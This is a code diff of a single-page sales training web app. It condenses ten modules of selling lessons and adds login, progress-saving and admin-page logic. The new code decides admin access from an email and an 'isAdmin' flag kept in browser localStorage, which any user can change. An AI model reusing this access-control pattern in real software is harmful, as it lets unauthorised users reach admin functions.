             title: "Types of Prospects",
-            content: "Not all prospects are created equal. Understanding different types helps you target better and waste less time.",
+            content: "Understand different prospect types.",
             key_points: [
-              "Cold leads: Never heard of you",
-              "Warm leads: Know of you or referred",
-              "Qualified leads: Match your ideal customer",
-              "Unqualified leads: Wrong fit (avoid these)",
-              "Decision makers: The people who actually buy"
-            ]
-          },
-          {
-            title: "Where to Find Customers",
-            content: "You can't sell if you don't know where to find people. Here are the best places to look.",
-            key_points: [
-              "LinkedIn (best for B2B, professional selling)",
-              "Cold email (personalized, trackable results)",
-              "Referrals (warmest leads, highest close rate)",
-              "Inbound (people coming to you)",
-              "Events & networking (face-to-face trust building)"
-            ]
-          },
-          {
-            title: "Building Your Prospect List",
-            content: "Quality matters more than quantity. 10 great prospects > 1000 bad ones. Here's how to build a targeted list.",
-            key_points: [
-              "Define your Ideal Customer Profile (ICP)",
-              "Who has the problem you solve?",
-              "Who has budget to pay for solutions?",
-              "Who has urgency (pain point driving change)?",
-              "Research 5-10 target accounts deeply"
+              "Cold leads - never heard of you",
+              "Warm leads - know you",
+              "Qualified - match your customer",
+              "Decision makers - who buys"
             ]
           }
         ],
-        exercise: "Build your first prospect list. Find 20 people/companies that match your ideal customer. Add them to a spreadsheet with: name, company, role, email/phone, why they're a good fit.",
-        script_example: "LinkedIn connection request: 'Hi [Name], I noticed you work at [Company] in [role]. We help [companies like yours] solve [problem] and get [result]. Would love to chat briefly about whether it's relevant—no pressure either way.'",
-        scenario: "You've identified a perfect prospect: a manager at a growing tech company. But you don't know them. What's your next move?",
-        video_recs: [
-          "Jeb Blount - Prospecting Like a Professional",
-          "Grant Cardone - The 10X Rule of Prospecting",
-          "HubSpot Sales Training - Finding Your Ideal Customer"
-        ],
-        quiz: [
-          {
-            question: "What makes a prospect 'qualified'?",
-            options: ["They answered your cold email", "They have the problem, budget, and urgency", "They're interested in talking", "They're in your industry"],
-            correct: 1
-          }
-        ]
+        exercise: "Build prospect list of 20 people",
+        script_example: "LinkedIn: 'Hi [Name], I noticed you work at [Company].'",
+        scenario: "Found perfect prospect. Don't know them. What's your move?"
       },
       {
         id: 3,
@@ -525,633 +1064,292 @@
         duration: "13-18 days",
         lessons: [
           {
-            title: "The First Interaction Rules",
-            content: "You have 10 seconds to make an impression. Here are the rules that separate successful salespeople from failures.",
+            title: "First 10 Seconds",
+            content: "You have 10 seconds to make impression.",
             key_points: [
-              "Be genuine and conversational (not salesy)",
-              "Show you've done your homework",
-              "Mention something specific about them",
-              "Lead with curiosity, not a pitch",
-              "Respect their time immediately"
-            ]
-          },
-          {
-            title: "Cold Email Mastery",
-            content: "Cold emails work. But most people do them wrong. Here's the formula that gets responses.",
-            key_points: [
-              "Subject line: Specific + curiosity (no spam words)",
-              "First line: Show you've researched them",
-              "Second line: State why you're reaching out (briefly)",
-              "Third line: Ask a question or offer something",
-              "Length: 3-5 sentences maximum"
-            ]
-          },
-          {
-            title: "Cold Call Psychology",
-            content: "Cold calling is dead? No. It's more effective than ever. Most salespeople just suck at it. Here's how to do it right.",
-            key_points: [
-              "Call between 8-10 AM or 4-5 PM (best times)",
-              "Have a reason they want to talk to you",
-              "Use curiosity, not pressure",
-              "If voicemail, leave a 20-second personal message",
-              "Follow up 3-5 times (most sales happen on follow-up)"
+              "Be genuine",
+              "Show homework",
+              "Be specific",
+              "Lead with curiosity",
+              "Respect their time"
             ]
           }
         ],
-        exercise: "Write 3 different cold emails/openers: one for a CEO, one for a manager, one for an individual contributor. Make each specific and personalized.",
-        script_example: "Cold email: 'Hey [Name], I saw you recently got promoted to [role] at [Company]. Congrats! I work with [similar role] at [similar companies] on [their challenge]. Quick question—are you dealing with [specific problem] right now, or is that not even on your radar?'",
-        scenario: "You call someone cold. They answer. Your heart is racing. What do you say in the first 3 seconds?",
-        video_recs: [
-          "Alex Hermosi - Cold Outreach Blueprint",
-          "Grant Cardone - Cold Calling Scripts",
-          "Outreach.io - Email Sequences That Convert"
-        ],
-        quiz: [
-          {
-            question: "What should your cold email subject line do?",
-            options: ["Use ALL CAPS to get attention", "Mention a specific company or person", "Say 'URGENT' or 'LIMITED TIME'", "Ask a generic question"],
-            correct: 1
-          }
-        ]
+        exercise: "Write 3 cold email openers",
+        script_example: "Email: 'Hey [Name], saw you got promoted. Congrats!'",
+        scenario: "Cold call. They answer. What do you say in 3 seconds?"
       },
       {
         id: 4,
-        title: "🔍 Discovery: Ask, Listen, Understand",
+        title: "🔍 Discovery: Listen & Understand",
         duration: "19-25 days",
         lessons: [
           {
-            title: "Discovery Call Fundamentals",
-            content: "The discovery call is where you win or lose the deal. Most salespeople skip this and wonder why they can't close. The best salespeople spend 70% of the call listening.",
+            title: "Discovery Calls",
+            content: "Listen 70%, talk 30%.",
             key_points: [
-              "Goal: Understand their situation deeply",
-              "NOT to pitch your solution",
-              "Ask layered questions (situation → impact → solutions)",
-              "Listen 70%, talk 30%",
-              "Take notes and summarize what you hear"
-            ]
-          },
-          {
-            title: "The Power Questions Framework",
-            content: "These questions open conversations and get people talking. Master these 7 questions and your discovery calls will transform.",
-            key_points: [
-              "Q1: 'How did you get your job/this role?'",
-              "Q2: 'Walk me through how you handle [their challenge] today'",
-              "Q3: 'What's working well? What's not?'",
-              "Q4: 'What would change if you solved this?'",
-              "Q5: 'Who else needs to be involved in this?'",
-              "Q6: 'What's your timeline?'",
-              "Q7: 'If we could solve this, would that be valuable?'"
-            ]
-          },
-          {
-            title: "Qualifying in vs. Out",
-            content: "Not every prospect is a good fit. Qualifying them early saves you time and them money. Here's how.",
-            key_points: [
-              "Does the prospect have the pain/problem?",
-              "Do they have budget for the solution?",
-              "Is there urgency to solve it?",
-              "Are you talking to the right person (decision maker)?",
-              "Is your solution actually the right fit?"
+              "Understand their situation",
+              "Don't pitch yet",
+              "Listen more",
+              "Take notes"
             ]
           }
         ],
-        exercise: "Record yourself doing a practice discovery call with a friend. Ask them about a problem they have (professional or personal). Listen more than you talk. Then listen to the recording and identify: How much did you listen vs. talk? Did you ask good follow-up questions? Did you uncover the real issue?",
-        script_example: "Discovery opener: 'Thanks for jumping on this call. I know you're busy, so I'll keep this brief. I wanted to learn more about your situation—specifically, how you're handling [their challenge] today. Would you walk me through that?'",
-        scenario: "You're on a discovery call. The prospect says 'We're looking for something to reduce costs.' What's your next move? Do you pitch your discount? Or ask another question?",
-        video_recs: [
-          "The Sandler Submarine - Questions Over Statements",
-          "Harvard Business School - Power Questions",
-          "Jeb Blount - Consultative Selling Framework"
-        ],
-        quiz: [
-          {
-            question: "What's the main goal of a discovery call?",
-            options: ["To pitch your solution", "To build rapport", "To understand their situation deeply", "To get them excited about your product"],
-            correct: 2
-          }
-        ]
+        exercise: "Record practice discovery call",
+        script_example: "Discovery: 'How do you handle [challenge] today?'",
+        scenario: "They say reduce costs. Pitch discount or ask more?"
       },
       {
         id: 5,
-        title: "🎤 Presentation: Showing Your Solution",
+        title: "🎤 Presentation: Show Solutions",
         duration: "26-32 days",
         lessons: [
           {
-            title: "The Presentation Pyramid",
-            content: "Most salespeople present wrong. They lead with features. You need to lead with how it solves THEIR specific problem.",
+            title: "Presentation Pyramid",
+            content: "Lead with their problem, not features.",
             key_points: [
-              "Level 1: The situation (recap what you heard)",
-              "Level 2: The impact (what it costs them to stay where they are)",
-              "Level 3: The solution (how you solve THEIR problem)",
-              "Level 4: The proof (case studies, social proof)",
-              "Level 5: The price (only after value is clear)"
-            ]
-          },
-          {
-            title: "Features vs. Benefits vs. Results",
-            content: "Nobody cares about features. They care about results. Here's the difference.",
-            key_points: [
-              "Feature: What your product does",
-              "Benefit: How it makes them better",
-              "Result: What they achieve/gain",
-              "Formula: 'This feature means that you get this result'",
-              "Example: Feature=Dashboard. Benefit=See data in one place. Result=Save 2 hours/week on reporting"
-            ]
-          },
-          {
-            title: "Handling the Demo",
-            content: "Whether it's a software demo or showing your service, here's how to make it impressive.",
-            key_points: [
-              "Show ONLY the parts relevant to THEIR problems",
-              "Don't show every feature (boring + confusing)",
-              "Let them ask questions and drive",
-              "Tell stories: 'One of our clients had a similar situation...'",
-              "End with the result: 'So if we implemented this, your team would...'"
+              "Their situation",
+              "The impact",
+              "Your solution",
+              "The proof",
+              "The price"
             ]
           }
         ],
-        exercise: "Take your product/service. List 5 features. For each feature, write the benefit and the result for YOUR ideal customer. Practice your pitch using this framework.",
-        script_example: "Presentation pitch: 'Based on what you shared, I think [specific solution] would be perfect because it solves [their problem] and would let you [desired result]. Here's how one of our similar clients used it...'",
-        scenario: "You're demoing your software. The prospect asks about a feature you don't have. What do you do?",
-        video_recs: [
-          "Sandler Sales - Feature/Benefit/Result Framework",
-          "Jeb Blount - Presentation Structure",
-          "HubSpot - Product Demonstration Best Practices"
-        ],
-        quiz: [
-          {
-            question: "What should you lead with in a presentation?",
-            options: ["Your company's history", "Their specific problem and results", "Your cheapest price", "Cool features"],
-            correct: 1
-          }
-        ]
+        exercise: "List features, benefits, results",
+        script_example: "Presentation: 'Based on what you shared...'",
+        scenario: "Demo. They ask about missing feature. What do you do?"
       },
       {
         id: 6,
-        title: "🛑 Objection Handling: Turn 'No' into 'Yes'",
+        title: "🛑 Objection Handling",
         duration: "33-40 days",
         lessons: [
           {
-            title: "Understanding Objections",
-            content: "Most salespeople fear objections. The truth? Objections mean the deal is still alive. They're questions, not rejections.",
+            title: "Handle Objections",
+            content: "Objections mean they're interested.",
             key_points: [
-              "Objections = Interest (or they'd just hang up)",
-              "Your job: Answer the real concern",
-              "Most stated objection ≠ real objection",
-              "'Price' usually means 'I don't see the value'",
-              "'Need to think' usually means 'I have a doubt'"
-            ]
-          },
-          {
-            title: "The 7 Most Common Objections & How to Handle Them",
-            content: "These 7 objections account for 80% of what you'll hear. Master these and you'll handle most.",
-            key_points: [
-              "Objection 1: 'It's too expensive'",
-              "Objection 2: 'We need to think about it'",
-              "Objection 3: 'We're happy with our current solution'",
-              "Objection 4: 'We don't have budget'",
-              "Objection 5: 'We need to talk to [someone else]'",
-              "Objection 6: 'Can you send me something?'",
-              "Objection 7: 'I'm not interested'"
-            ]
-          },
-          {
-            title: "The Question-Based Response Method",
-            content: "The best way to handle an objection isn't to defend yourself. It's to ask a question.",
-            key_points: [
-              "Step 1: Listen fully (don't interrupt)",
-              "Step 2: Acknowledge their concern ('I get it, that makes sense')",
-              "Step 3: Ask a clarifying question",
-              "Step 4: Listen to the real issue",
-              "Step 5: Provide a relevant answer"
+              "Objections = Interest",
+              "Answer real concern",
+              "Listen first",
+              "Ask clarifying question"
             ]
           }
         ],
-        exercise: "List the 5 most common objections YOUR prospects give you. For each one, write: (1) The question you'd ask to understand it better, (2) A relevant story/proof point, (3) Your response.",
-        script_example: "Handling 'It's too expensive': 'I hear you. Price is a factor. Help me understand—is the price itself the issue, or is it that you're not clear on the ROI yet? Because most of our clients see payback in 4-6 months.'",
-        scenario: "Prospect says: 'Your solution is good, but competitor X is cheaper.' What do you say?",
-        video_recs: [
-          "Jeb Blount - Objection Handling",
-          "The Sandler Submarine - Recognizing Smoke",
-          "Grant Cardone - Overcoming Price Objections"
-        ],
-        quiz: [
-          {
-            question: "What does an objection really mean?",
-            options: ["The deal is dead", "The prospect is not interested", "The prospect has a concern worth addressing", "You should move on"],
-            correct: 2
-          }
-        ]
+        exercise: "Handle 5 common objections",
+        script_example: "Objection: 'Is it the price or the ROI?'",
+        scenario: "They say competitor is cheaper. Your response?"
       },
       {
         id: 7,
-        title: "🤝 Building Relationships & Trust",
+        title: "🤝 Building Relationships",
         duration: "41-48 days",
         lessons: [
           {
-            title: "Sales is Relationship Building",
-            content: "People buy from people they trust. Building genuine relationships is 10x more important than any technique.",
+            title: "Relationship Building",
+            content: "People buy from people they trust.",
             key_points: [
-              "Follow through on every promise",
-              "Be authentic (not fake or overly salesy)",
-              "Remember details about them (personal, not just business)",
-              "Send helpful resources (no strings)",
-              "Stay in touch even when there's no deal"
-            ]
-          },
-          {
-            title: "Social Proof & Credibility",
-            content: "People don't trust salespeople. But they trust social proof. Learn to use it.",
-            key_points: [
-              "Case studies (similar customer, similar problem, real result)",
-              "Testimonials (video is better than written)",
-              "Results/outcomes (numbers always work)",
-              "Industry recognition/awards",
-              "'Many companies like you use us...' (social proof)"
-            ]
-          },
-          {
-            title: "The Follow-Up Game",
-            content: "Most deals close on follow-up #3-5. Most salespeople give up at #2. This is where persistence wins.",
-            key_points: [
-              "After discovery: Follow up within 24 hours",
-              "After proposal: Follow up in 48 hours",
-              "After objection: Follow up in 5 days with new info",
-              "Use different channels (email, phone, LinkedIn)",
-              "Add value in each follow-up (research, case study, intro)"
+              "Follow through",
+              "Be authentic",
+              "Remember details",
+              "Add value",
+              "Stay in touch"
             ]
           }
         ],
-        exercise: "Pick 5 prospects you've lost or gone cold with. Reach out to them with genuine value (article, connection, relevant insight). No pitch. Just value.",
-        script_example: "Follow-up email: 'Hey [Name], I was thinking about our conversation regarding [their challenge]. I came across this case study that reminded me of your situation. Thought you might find it useful. No rush to respond—just wanted to share.'",
-        scenario: "A prospect went silent after your proposal. It's been 2 weeks. Do you follow up? How?",
-        video_recs: [
-          "Jeb Blount - The 6 Ps of Sales",
-          "Noah Kagan - Follow Up Strategy",
-          "Harvard Business Review - Trust in Sales"
-        ],
-        quiz: [
-          {
-            question: "When do most deals actually close?",
-            options: ["On the first call", "On the first proposal", "After 3-5 follow-ups", "When the prospect initiates"],
-            correct: 2
-          }
-        ]
+        exercise: "Reach out to 5 lost prospects",
+        script_example: "Follow-up: 'Thought you'd find this useful'",
+        scenario: "Prospect silent 2 weeks after proposal. Follow up?"
       },
       {
         id: 8,
-        title: "🎯 Closing: Asking for the Business",
+        title: "🎯 Closing: Get Commitment",
         duration: "49-54 days",
         lessons: [
           {
-            title: "The Closing Mindset",
-            content: "Closing isn't pushy. It's not evil. It's simply helping someone move forward when they're ready.",
+            title: "Closing Techniques",
+            content: "Help them move forward.",
             key_points: [
-              "Closing starts in discovery (when you qualify)",
-              "Closing is a natural progression",
-              "If they're qualified, closing isn't hard",
-              "Assumptive close works: Assume they're buying",
-              "Silence after asking for the close is your friend"
-            ]
-          },
-          {
-            title: "7 Closing Techniques",
-            content: "Different prospects need different closes. Here are 7 that work.",
-            key_points: [
-              "Assumptive Close: 'Great, I'll get your contract ready'",
-              "Direct Close: 'Should we move forward?'",
-              "Alternative Close: 'Do you prefer quarterly or annual billing?'",
-              "Take-Away Close: 'If this isn't the right time, I understand'",
-              "Urgency Close: 'Pricing is locked until Friday'",
-              "Summary Close: 'So to recap, we're solving X, Y, Z'",
-              "Question Close: 'What would make this a yes?'"
-            ]
-          },
-          {
-            title: "Handling 'I Need to Think'",
-            content: "This is the #1 deal killer. Here's how to actually move forward when you hear it.",
-            key_points: [
-              "Don't just accept it (it usually means no)",
-              "Ask: 'What specifically do you need to think about?'",
-              "Uncover the real hesitation",
-              "Provide info/social proof to address it",
-              "Ask for next step: 'When should we reconnect?'"
+              "Closing starts in discovery",
+              "Natural progression",
+              "Assumptive close",
+              "Silence is okay"
             ]
           }
         ],
-        exercise: "Practice closing statements. Write 5 different closes you'd use based on different scenarios. Practice saying them out loud until they feel natural.",
-        script_example: "Assumptive close: 'Perfect. Here's what I'm thinking—I'll get everything set up for your team this week. You'll get access Monday. How does that sound?'",
-        scenario: "You've had 3 great calls with a prospect. Everything points to yes. But they haven't committed. What do you do?",
-        video_recs: [
-          "Sandler Sales - Closing Techniques",
-          "Jeb Blount - Yes or No Selling",
-          "Grant Cardone - The 10 Rules of Closing"
-        ],
-        quiz: [
-          {
-            question: "What should you do after you ask someone to close?",
-            options: ["Keep talking to fill the silence", "Wait for their answer (silence is okay)", "Ask another question", "Reduce your price"],
-            correct: 1
-          }
-        ]
+        exercise: "Write 5 different closes",
+        script_example: "Assumptive: 'I'll set this up. Sound good?'",
+        scenario: "3 great calls. Everything says yes. Still no commitment. Do what?"
       },
       {
         id: 9,
-        title: "📊 Managing Your Sales Pipeline & Metrics",
+        title: "📊 Pipeline Management",
         duration: "55-60 days",
         lessons: [
           {
-            title: "Your Sales Metrics Matter",
-            content: "You can't manage what you don't measure. Here are the metrics that actually matter.",
+            title: "Sales Metrics",
+            content: "Manage what you measure.",
             key_points: [
-              "Metric 1: Leads contacted (activity)",
-              "Metric 2: Qualified opportunities (quality)",
-              "Metric 3: Conversion rates (efficiency)",
-              "Metric 4: Deal size (revenue impact)",
-              "Metric 5: Sales cycle length (time to close)",
-              "Metric 6: Close rate (% of qualified deals that close)"
-            ]
-          },
-          {
-            title: "Pipeline Management 101",
-            content: "Your pipeline is your business. Manage it right and you'll always hit quota.",
-            key_points: [
-              "Stage 1: Prospect (identified)",
-              "Stage 2: Discovery (call completed)",
-              "Stage 3: Qualification (fits criteria)",
-              "Stage 4: Proposal (solution presented)",
-              "Stage 5: Negotiation (terms discussed)",
-              "Stage 6: Close (deal won)"
-            ]
-          },
-          {
-            title: "The Sales Funnel Math",
-            content: "You need to understand your numbers or you'll never hit quota.",
-            key_points: [
-              "If your close rate is 25%, you need 4x the opportunities",
-              "If your average deal is $10k and quota is $100k, need 10 deals",
-              "If your sales cycle is 60 days, prospect today for money in 60 days",
-              "If 50% of proposals go forward, need 2x the proposals"
+              "Leads contacted",
+              "Qualified opportunities",
+              "Conversion rates",
+              "Deal size",
+              "Close rate"
             ]
           }
         ],
-        exercise: "Build your sales dashboard. For last month, calculate: (1) Leads contacted, (2) Discovered, (3) Qualified, (4) Proposals, (5) Closed. What's your conversion rate at each stage?",
-        script_example: "Pipeline management email to yourself: Weekly, assess every deal in your pipeline. Update status, next steps, probability, expected close date.",
-        scenario: "You're behind quota with 2 weeks left in the month. You have 3 deals in proposal stage. What's your action plan?",
-        video_recs: [
-          "HubSpot - Sales Pipeline Best Practices",
-          "Jeb Blount - The 7 Habits of Highly Effective Salespeople",
-          "Grant Cardone - Closing the Gap to Quota"
-        ],
-        quiz: [
-          {
-            question: "If you close 25% of qualified deals and need to close 10 deals, how many qualified opportunities do you need?",
-            options: ["10", "25", "40", "100"],
-            correct: 2
-          }
-        ]
+        exercise: "Calculate your conversion rates",
+        script_example: "Track: Leads → Qualified → Proposal → Closed",
+        scenario: "Behind quota 2 weeks left. 3 deals in proposal. Action?"
       },
       {
         id: 10,
-        title: "🏆 Mastery: From Good to Great to Unstoppable",
-        duration: "61-90 days (ongoing)",
+        title: "🏆 Mastery & Dominance",
+        duration: "61-90 days",
         lessons: [
           {
-            title: "Your Competitive Advantages",
-            content: "You're now trained. But to dominate, you need to develop personal advantages that competitors can't copy.",
+            title: "Become Great",
+            content: "Small improvements compound.",
             key_points: [
-              "What's YOUR unique value proposition?",
-              "What do you know that others don't?",
-              "Who's your network? (Relationships = power)",
-              "What's your story? (People remember stories)",
-              "What's your obsession? (Passion is attractive)"
-            ]
-          },
-          {
-            title: "Continuous Learning",
-            content: "The market changes. Your skills must evolve. Here's how to stay sharp.",
-            key_points: [
-              "Read: Sales books (Jeb Blount, Grant Cardone, Sandler)",
-              "Listen: Sales podcasts weekly",
-              "Practice: Record yourself, listen back, improve",
-              "Network: Join sales communities/masterminds",
-              "Teach: Teaching others cements your learning"
-            ]
-          },
-          {
-            title: "The 1% Rule",
-            content: "The difference between a good salesperson and a great one is small. It's the 1% edge multiplied by 100 days.",
-            key_points: [
-              "1% better at prospecting × 100 days = 100% more deals",
-              "1% better at closing × 100 days = 100% more revenue",
-              "1% better at relationships × 100 days = 100% more referrals",
-              "Tiny improvements compound massively over time"
+              "Your unique value",
+              "What you know",
+              "Your network",
+              "Your story",
+              "Your obsession"
             ]
           }
         ],
-        exercise: "Create your 90-day action plan. Set specific, measurable goals: (1) Opportunities to create, (2) Deals to close, (3) Revenue target, (4) Skills to develop, (5) People to network with.",
-        script_example: "Monthly self-coaching call: Record yourself. Listen. Rate yourself on: prospecting, discovery, presentation, objection handling, closing. Where's your weakness? Focus there next month.",
-        scenario: "You're now top performer. How do you stay on top? What keeps you hungry?",
-        video_recs: [
-          "Jeb Blount - Mastering Your Sales Game",
-          "Grant Cardone - The 10X Rule",
-          "Daily Sales Huddle - Continuous Improvement"
-        ],
-        quiz: [
-          {
-            question: "What's the key to long-term sales success?",
-            options: ["Working harder than everyone", "Continuous learning and 1% daily improvements", "Having a good product", "Being naturally gifted at sales"],
-            correct: 1
-          }
-        ]
+        exercise: "90-day action plan",
+        script_example: "Monthly review: Record yourself, rate performance",
+        scenario: "Top performer. How do you stay hungry?"
       }
     ];
 
-    // Load modules
-    function initializeModules() {
+    function initializeBootcamp() {
+      const current = JSON.parse(localStorage.getItem('currentUser') || '{}');
+      document.getElementById('userName').textContent = current.name || 'Student';
+      document.getElementById('userEmail').textContent = current.email;
+
+      if (current.email === ADMIN_EMAIL) {
+        document.getElementById('adminBtnBootcamp').style.display = 'inline-block';
+      }
+
       const moduleList = document.getElementById('moduleList');
-      let lessonsCount = 0;
-      
+      moduleList.innerHTML = '';
+
       modules.forEach((module, index) => {
-        lessonsCount += module.lessons.length;
         const li = document.createElement('li');
         li.className = 'module-item';
-        li.dataset.module = index;
-        li.textContent = `${module.title}`;
+        li.textContent = module.title;
         li.onclick = () => showModule(index);
         moduleList.appendChild(li);
       });
 
-      document.getElementById('totalLessons').textContent = lessonsCount;
-      document.getElementById('practiceExercises').textContent = modules.length;
-      document.getElementById('realScripts').textContent = modules.length;
-
       showModule(0);
-      updateProgress();
+      loadProgress();
     }
 
     function showModule(index) {
       const module = modules[index];
       document.querySelectorAll('.module-item').forEach(el => el.classList.remove('active'));
-      document.querySelector(`[data-module="${index}"]`).classList.add('active');
+      document.querySelectorAll('.module-item')[index].classList.add('active');
 
       let html = `
         <div class="module active">
           <h2>${module.title}</h2>
-          <div class="module-meta">Duration: ${module.duration} | Module ${index + 1} of ${modules.length}</div>
+          <p style="color: #999; font-size: 14px; margin-bottom: 20px;">Duration: ${module.duration}</p>
       `;
 
-      // Lessons
-      module.lessons.forEach((lesson, lessonIndex) => {
+      module.lessons.forEach((lesson, i) => {
         html += `
           <div class="lesson">
-            <h3>${lessonIndex + 1}. ${lesson.title}</h3>
+            <h3>${i + 1}. ${lesson.title}</h3>
             <p>${lesson.content}</p>
-            <h4 style="margin-top: 15px; color: #667eea;">Key Points:</h4>
-            <ul style="margin: 10px 0 0 20px;">
-              ${lesson.key_points.map(point => `<li>${point}</li>`).join('')}
+            <h4 style="color: #667eea; margin-top: 15px;">Key Points:</h4>
+            <ul>
+              ${lesson.key_points.map(p => `<li>${p}</li>`).join('')}
             </ul>
           </div>
         `;
       });
 
-      // Exercise
       html += `
         <div class="exercise">
-          <h4>💪 Your Assignment (Do This!)</h4>
+          <h4>💪 Assignment:</h4>
           <p>${module.exercise}</p>
-          <div class="checklist">
-            <label class="checklist-item">
-              <input type="checkbox" onchange="updateProgress()">
-              <span>I've completed this assignment</span>
-            </label>
+          <div class="checklist-item">
+            <input type="checkbox" data-module="${index}" onchange="updateProgress()">
+            <span>Completed this module</span>
           </div>
         </div>
-      `;
 
-      // Script Example
-      if (module.script_example) {
-        html += `
-          <div class="script-box">
-            <button class="script-copy" onclick="copyToClipboard(this, '${module.script_example.replace(/'/g, "\\'")}')">Copy Script</button>
-            <strong>📝 Real Script Example:</strong>
-            <br><br>
-            ${module.script_example.replace(/\n/g, '<br>')}
-          </div>
-        `;
-      }
-
-      // Scenario
-      html += `
-        <div class="scenario-box">
-          <h4>🎬 Real-World Scenario</h4>
-          <p><strong>The Situation:</strong> ${module.scenario}</p>
-          <p><strong>What would YOU do?</strong> (Think about it before looking at solutions)</p>
+        <div style="background: #263238; color: white; padding: 20px; margin: 20px 0; border-radius: 8px;">
+          <strong>📝 Script Example:</strong><br><br>
+          ${module.script_example}
         </div>
-      `;
 
-      // Video Recommendations
-      if (module.video_recs && module.video_recs.length > 0) {
-        html += `
-          <div class="video-rec">
-            <strong>📺 Recommended Videos to Watch:</strong>
-            <ul style="margin: 10px 0 0 20px;">
-              ${module.video_recs.map(rec => `<li>${rec}</li>`).join('')}
-            </ul>
-          </div>
-        `;
-      }
+        <div style="background: #fff3e0; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 4px solid #ff9800;">
+          <h4 style="color: #e65100;">🎬 Real-World Scenario</h4>
+          <p>${module.scenario}</p>
+        </div>
 
-      // Quiz
-      if (module.quiz && module.quiz.length > 0) {
-        html += `
-          <div class="quiz">
-            <h4>✅ Quick Quiz (Test Your Knowledge)</h4>
-            ${module.quiz.map((q, qIndex) => `
-              <div class="quiz-question">
-                <strong>Q${qIndex + 1}: ${q.question}</strong>
-                ${q.options.map((opt, oIndex) => `
-                  <label>
-                    <input type="radio" name="quiz-${index}-${qIndex}" value="${oIndex}" onchange="checkAnswer(this, ${q.correct}, '${module.title}')">
-                    ${opt}
-                  </label>
-                `).join('')}
-              </div>
-            `).join('')}
-          </div>
-        `;
-      }
-
-      // Buttons
-      html += `
         <div class="buttons">
-          ${index > 0 ? `<button class="btn-secondary" onclick="showModule(${index - 1})">← Previous Module</button>` : ''}
-          ${index < modules.length - 1 ? `<button class="btn-primary" onclick="showModule(${index + 1})">Next Module →</button>` : `<button class="btn-success" onclick="completeCourse()">🎓 Complete Course & Get Certificate</button>`}
+          ${index > 0 ? `<button class="btn-secondary" onclick="showModule(${index - 1})">← Previous</button>` : ''}
+          ${index < modules.length - 1 ? `<button class="btn-primary" onclick="showModule(${index + 1})">Next →</button>` : ''}
         </div>
       `;
 
-      html += '</div>';
       document.getElementById('mainContent').innerHTML = html;
-    }
-
-    function copyToClipboard(btn, text) {
-      navigator.clipboard.writeText(text);
-      btn.textContent = 'Copied! ✓';
-      setTimeout(() => btn.textContent = 'Copy Script', 2000);
-    }
-
-    function checkAnswer(input, correct, moduleTitle) {
-      if (parseInt(input.value) === correct) {
-        input.parentElement.style.color = '#4caf50';
-        input.parentElement.style.fontWeight = 'bold';
-      } else {
-        input.parentElement.style.color = '#f44336';
-      }
+      loadProgress();
     }
 
     function updateProgress() {
+      const current = JSON.parse(localStorage.getItem('currentUser') || '{}');
       const completed = document.querySelectorAll('.checklist-item input:checked').length;
-      const total = modules.length;
-      const percent = Math.round((completed / total) * 100);
-      
+      const percent = Math.round((completed / modules.length) * 100);
+
       document.getElementById('progressFill').style.width = percent + '%';
       document.getElementById('progressText').textContent = percent + '%';
       document.getElementById('completedCount').textContent = completed;
 
-      // Mark modules as completed
-      const completedModules = document.querySelectorAll('.checklist-item input:checked').length;
+      saveProgress(current.email, { completed, total: modules.length, percent });
+
       document.querySelectorAll('.module-item').forEach((el, idx) => {
-        if (idx < completedModules) {
+        if (idx < completed) {
           el.classList.add('completed');
         }
       });
     }
 
-    function completeCourse() {
-      const name = prompt("Congratulations! Enter your name for your certificate:");
-      if (name) {
-        document.body.innerHTML = `
-          <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:linear-gradient(135deg, #667eea 0%, #764ba2 100%);padding:20px;">
-            <div style="background:linear-gradient(135deg, #ffd700, #ffed4e);padding:60px;border-radius:10px;text-align:center;max-width:600px;box-shadow:0 20px 60px rgba(0,0,0,0.3);">
-              <h1 style="color:#333;margin-bottom:20px;font-size:36px;">🎓 Certificate of Completion</h1>
-              <p style="color:#666;font-size:18px;margin-bottom:30px;">This certifies that</p>
-              <h2 style="color:#d4a300;font-size:32px;margin-bottom:30px;border-bottom:3px solid #d4a300;padding-bottom:15px;">${name}</h2>
-              <p style="color:#666;font-size:16px;margin-bottom:10px;">has successfully completed the</p>
-              <h3 style="color:#333;font-size:24px;margin-bottom:30px;">Complete Sales Training Bootcamp</h3>
-              <p style="color:#666;font-size:14px;margin-bottom:30px;">Mastering the art of selling in 60 days</p>
-              <p style="color:#666;font-size:12px;">Completed: ${new Date().toLocaleDateString()}</p>
-              <hr style="border:1px solid #d4a300;margin:30px 0;">
-              <p style="color:#666;font-size:13px;font-style:italic;">You are now equipped with the skills, scripts, and mindset<br>to become a top 10% salesperson</p>
-              <button onclick="window.print()" style="padding:12px 24px;background:#667eea;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;margin-top:30px;">🖨️ Print Certificate</button>
-              <button onclick="location.reload()" style="padding:12px 24px;background:#4caf50;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;margin-top:10px;margin-left:10px;">← Start Over</button>
-            </div>
-          </div>
-        `;
+    function loadProgress() {
+      const current = JSON.parse(localStorage.getItem('currentUser') || '{}');
+      const user = getUser(current.email);
+      
+      if (user && user.progress) {
+        const checkboxes = document.querySelectorAll('.checklist-item input');
+        checkboxes.forEach((box, idx) => {
+          if (idx < user.progress.completed) {
+            box.checked = true;
+          }
+        });
+        updateProgress();
       }
     }
 
-    // Initialize on load
-    initializeModules();
+    // ====== CHECK ON LOAD ======
+    window.addEventListener('load', () => {
+      const current = JSON.parse(localStorage.getItem('currentUser') || '{}');
+      
+      if (current.email && current.isAdmin) {
+        showPage('admin');
+        loadAdminData();
+      } else if (current.email) {
+        showPage('bootcamp');
+        initializeBootcamp();
+      } else {
+        showPage('login');
+      }
+    });
   </script>
 </body>
 </html>
